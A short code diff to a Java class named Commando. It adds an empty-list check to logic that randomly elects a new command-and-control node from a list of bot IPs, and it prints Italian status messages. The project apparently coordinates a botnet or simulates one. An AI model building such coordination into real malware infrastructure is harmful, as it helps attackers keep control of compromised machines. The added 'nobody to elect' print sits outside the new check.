@@ -333,12 +333,14 @@ public class Commando {
 					ccList.add(bot.getIp());
 			}
 			System.out.println(ccList.remove(nServ.getMyIp().toString()));
+			if(ccList.size()>0){
 			String ip = ccList.get((int) Math.ceil(Math.random()*(ccList.size()-1)));
 			System.out.println("ho eletto "+ip);
 			if(ccReq.becameCc(ip)){
 				newKing = ip;
 			}
 			System.out.println("erection completed ");
+			} System.out.println("nessuno da eleggere");
 		//elegilo passa i dati
 		// passa il potere	
 		}
